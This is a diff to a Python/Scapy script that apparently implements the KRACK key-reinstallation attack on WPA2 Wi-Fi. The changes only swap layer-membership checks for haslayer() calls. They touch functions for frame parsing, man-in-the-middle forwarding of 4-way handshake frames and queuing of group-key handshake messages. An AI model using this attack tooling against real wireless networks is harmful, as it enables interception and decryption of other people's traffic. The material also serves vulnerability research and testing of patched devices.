@@ -172,7 +172,7 @@ def dot11_get_seqnum(p):
 
 def dot11_get_iv(p):
 	"""Scapy can't handle Extended IVs, so do this properly ourselves"""
-	if Dot11WEP not in p:
+	if not p.haslayer(Dot11WEP):
 		log(ERROR, "INTERNAL ERROR: Requested IV of plaintext frame")
 		return 0
 
@@ -183,7 +183,7 @@ def dot11_get_iv(p):
 		return ord(wep.iv[0]) + (ord(wep.iv[1]) << 8) + (ord(wep.iv[2]) << 16)
 
 def dot11_get_tid(p):
-	if Dot11QoS in p:
+	if p.haslayer(Dot11QoS):
 		return ord(str(p[Dot11QoS])[0]) & 0x0F
 	return 0
 
@@ -196,7 +196,7 @@ def get_eapol_msgnum(p):
 	FLAG_ACK      = 0b0010000000
 	FLAG_SECURE   = 0b1000000000
 
-	if not EAPOL in p: return 0
+	if not p.haslayer(EAPOL): return 0
 
 	keyinfo = str(p[EAPOL])[5:7]
 	flags = struct.unpack(">H", keyinfo.encode())[0]
@@ -230,28 +230,28 @@ def dot11_to_str(p):
 		7: "Unexp_Class3_Frame", 8: "Leaving", 15: "4-way_HS_timeout"}
 	dict_or_str = lambda d, v: d.get(v, str(v))
 	if p.type == 0:
-		if Dot11Beacon in p:     return "Beacon(seq=%d, TSF=%d)" % (dot11_get_seqnum(p), p[Dot11Beacon].timestamp)
-		if Dot11ProbeReq in p:   return "ProbeReq(seq=%d)" % dot11_get_seqnum(p)
-		if Dot11ProbeResp in p:  return "ProbeResp(seq=%d)" % dot11_get_seqnum(p)
-		if Dot11Auth in p:       return "Auth(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11Auth].status)
-		if Dot11Deauth in p:     return "Deauth(seq=%d, reason=%s)" % (dot11_get_seqnum(p), dict_or_str(DEAUTH_REASON, p[Dot11Deauth].reason))
-		if Dot11AssoReq in p:    return "AssoReq(seq=%d)" % dot11_get_seqnum(p)
-		if Dot11ReassoReq in p:  return "ReassoReq(seq=%d)" % dot11_get_seqnum(p)
-		if Dot11AssoResp in p:   return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
-		if Dot11ReassoResp in p: return "ReassoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11ReassoResp].status)
-		if Dot11Disas in p:      return "Disas(seq=%d)" % dot11_get_seqnum(p)
+		if p.haslayer(Dot11Beacon):     return "Beacon(seq=%d, TSF=%d)" % (dot11_get_seqnum(p), p[Dot11Beacon].timestamp)
+		if p.haslayer(Dot11ProbeReq):   return "ProbeReq(seq=%d)" % dot11_get_seqnum(p)
+		if p.haslayer(Dot11ProbeResp):  return "ProbeResp(seq=%d)" % dot11_get_seqnum(p)
+		if p.haslayer(Dot11Auth):       return "Auth(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11Auth].status)
+		if p.haslayer(Dot11Deauth):     return "Deauth(seq=%d, reason=%s)" % (dot11_get_seqnum(p), dict_or_str(DEAUTH_REASON, p[Dot11Deauth].reason))
+		if p.haslayer(Dot11AssoReq):    return "AssoReq(seq=%d)" % dot11_get_seqnum(p)
+		if p.haslayer(Dot11ReassoReq):  return "ReassoReq(seq=%d)" % dot11_get_seqnum(p)
+		if p.haslayer(Dot11AssoResp):   return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
+		if p.haslayer(Dot11ReassoResp): return "ReassoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11ReassoResp].status)
+		if p.haslayer(Dot11Disas):      return "Disas(seq=%d)" % dot11_get_seqnum(p)
 		if p.subtype == 13:      return "Action(seq=%d)" % dot11_get_seqnum(p)
 	elif p.type == 1:
 		if p.subtype ==  9:      return "BlockAck"
 		if p.subtype == 11:      return "RTS"
 		if p.subtype == 13:      return "Ack"
 	elif p.type == 2:
-		if Dot11WEP in p:        return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
+		if p.haslayer(Dot11WEP):        return "EncryptedData(seq=%d, IV=%d)" % (dot11_get_seqnum(p), dot11_get_iv(p))
 		if p.subtype == 4:       return "Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
 		if p.subtype == 12:      return "QoS-Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
-		if EAPOL in p:
+		if p.haslayer(EAPOL):
 			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d,replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
-			elif EAP in p:       return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
+			elif p.haslayer(EAP):       return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
 			else:                return repr(p)
 	return repr(p)			
 
@@ -278,7 +278,7 @@ def append_csa(p, channel, count=1):
 	return p
 
 def get_tlv_value(p, typee):
-	if not Dot11Elt in p: return None
+	if not p.haslayer(Dot11Elt): return None
 	el = p[Dot11Elt]
 	while isinstance(el, Dot11Elt):
 		if el.ID == typee:
@@ -290,7 +290,7 @@ def get_tlv_value(p, typee):
 
 def print_rx(level, name, p, color=None, suffix=None):
 	if p[Dot11].type == 1: return
-	if color is None and (Dot11Deauth in p or Dot11Disas in p): color="orange"
+	if color is None and (p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas)): color="orange"
 	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)
 
 class NetworkConfig():
@@ -440,7 +440,7 @@ class ClientState():
 			# Forwarding rules when attacking the 4-way handshake
 			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
 				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
-				return Dot11Auth in p or Dot11AssoReq in p or Dot11AssoResp in p or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) \
+				return p.haslayer(Dot11Auth) or p.haslayer(Dot11AssoReq) or p.haslayer(Dot11AssoResp) or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) \
 					or (p.type == 0 and p.subtype == 13)
 			return self.state in [ClientState.Success_Reinstalled]
 
@@ -644,7 +644,7 @@ class KRAckAttack():
 		if not args.group: return False
 
 		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
-		if Dot11WEP in p and p.addr2 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
+		if p.haslayer(Dot11WEP) and p.addr2 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
 			# TODO: Detect that it's not a retransmission
 			self.group1.append(p)
 			log(STATUS, "Queued %s group message 1's" % len(self.group1), showtime=False)
@@ -661,7 +661,7 @@ class KRAckAttack():
 		if not args.group: return
 	
 		# Does this look like a group key handshake frame -- FIXME do not hardcode the TID
-		if Dot11WEP in p and p.addr1 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
+		if p.haslayer(Dot11WEP) and p.addr1 == self.apmac and p.addr3 == self.apmac and dot11_get_tid(p) == 7:
 			log(STATUS, "Got a likely group message 2", showtime=False)
 
 
@@ -672,7 +672,7 @@ class KRAckAttack():
 		# 1. Handle frames sent TO the real AP
 		if p.addr1 == self.apmac:
 			# If it's an authentication to the real AP, always display it ...
-			if Dot11Auth in p:
+			if p.haslayer(Dot11Auth):
 				print_rx(INFO, "Real channel ", p, color="orange")
 
 				# ... with an extra clear warning when we wanted to MitM this specific client
@@ -687,11 +687,11 @@ class KRAckAttack():
 				self.clients[p.addr2].update_state(ClientState.Connecting)
 
 			# Remember association request to save connection parameters
-			elif Dot11AssoReq in p:
+			elif p.haslayer(Dot11AssoReq):
 				if p.addr2 in self.clients: self.clients[p.addr2].assocreq = p
 
 			# Clients sending a deauthentication or disassociation to the real AP are also interesting ...
-			elif Dot11Deauth in p or Dot11Disas in p:
+			elif p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
 				print_rx(INFO, "Real channel ", p)
 				if p.addr2 in self.clients: del self.clients[p.addr2]
 
@@ -718,7 +718,7 @@ class KRAckAttack():
 
 			# Decide whether we will (eventually) forward it
 			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
-			might_forward = might_forward or (args.group and dot11_is_group(p) and Dot11WEP in p)
+			might_forward = might_forward or (args.group and dot11_is_group(p) and p.haslayer(Dot11WEP))
 
 			# Pay special attention to Deauth and Disassoc frames
 			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
